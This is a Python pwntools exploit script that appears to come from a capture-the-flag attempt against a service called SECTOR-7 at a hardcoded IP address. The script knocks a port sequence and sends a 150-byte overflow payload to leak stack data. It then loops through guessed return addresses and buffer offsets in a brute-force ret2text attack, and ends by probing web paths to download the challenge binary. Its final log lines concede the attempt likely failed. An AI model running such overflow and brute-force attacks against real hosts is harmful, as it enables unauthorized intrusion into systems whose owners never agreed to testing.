#!/usr/bin/env python3
"""
Final comprehensive attempt at SECTOR-7
"""

from pwn import *
import time
import requests

context.log_level = 'info'

target_ip = "13.206.58.35"
target_port = 9999

def knock_ports():
    sequence = [9000, 2600, 1337]
    for port in sequence:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, port))
            s.close()
        except:
            pass
        time.sleep(0.2)
    time.sleep(0.8)

log.info("SECTOR-7 Final Exploitation Attempt")

# Strategy 1: Try to leak information with partial overflow
log.info("\n[1] Attempting information leak...")
try:
    knock_ports()
    conn = remote(target_ip, target_port)
    conn.recvuntil(b"password:")
    
    # Send a payload that might leak stack data
    payload = b"A" * 150  # Just before crash point
    conn.sendline(payload)
    
    response = conn.recvall(timeout=2)
    log.info(f"Response: {response}")
    
    # Check for any leaked data
    if len(response) > 100:
        log.success("Got extended response!")
        print(hexdump(response))
    
    conn.close()
except Exception as e:
    log.error(f"Strategy 1 failed: {e}")

time.sleep(2)

# Strategy 2: Try ret2text - jump to different parts of the binary
log.info("\n[2] Attempting ret2text attack...")
try:
    # Common function addresses in CTF binaries
    addresses = [
        0x401000, 0x401100, 0x401200, 0x401300, 0x401400,
        0x400900, 0x400a00, 0x400b00, 0x400c00,
    ]
    
    for addr in addresses:
        knock_ports()
        conn = remote(target_ip, target_port, level='error')
        conn.recvuntil(b"password:")
        
        # Try different buffer sizes
        for offset in [136, 144, 152, 160, 168]:
            payload = b"A" * offset + p64(addr)
            conn2 = remote(target_ip, target_port, level='error')
            conn2.recvuntil(b"password:")
            conn2.sendline(payload)
            
            try:
                response = conn2.recvall(timeout=1)
                if b"flag" in response.lower() or b"kaal{" in response.lower() or len(response) > 100:
                    log.success(f"Hit with addr={hex(addr)}, offset={offset}!")
                    print(response.decode('utf-8', errors='ignore'))
                    exit(0)
            except:
                pass
            
            conn2.close()
        
        conn.close()
        
except Exception as e:
    log.error(f"Strategy 2 failed: {e}")

# Strategy 3: Check if successful pwn unlocks web download
log.info("\n[3] Checking web service after various attempts...")
try:
    # Try to access /challenge with different methods
    endpoints = ["/challenge", "/download", "/binary", "/flag", "/kaal", "/sector7"]
    
    for endpoint in endpoints:
        r = requests.get(f"http://{target_ip}:8080{endpoint}", timeout=2)
        if r.status_code not in [403, 404]:
            log.success(f"Found accessible endpoint: {endpoint} -> {r.status_code}")
            print(r.text[:500])
            
            # Try to download if it's a binary
            if r.headers.get('Content-Type', '').startswith('application/'):
                with open(f"sector7_binary{endpoint.replace('/', '_')}", 'wb') as f:
                    f.write(r.content)
                log.success(f"Downloaded binary!")
                
except Exception as e:
    log.error(f"Strategy 3 failed: {e}")

log.info("\n[*] All strategies attempted")
log.info("This challenge likely requires:")
log.info("  1. The actual binary for proper analysis")
log.info("  2. Or a specific password/exploit technique we haven't discovered")
log.info("  3. Or additional reconnaissance")
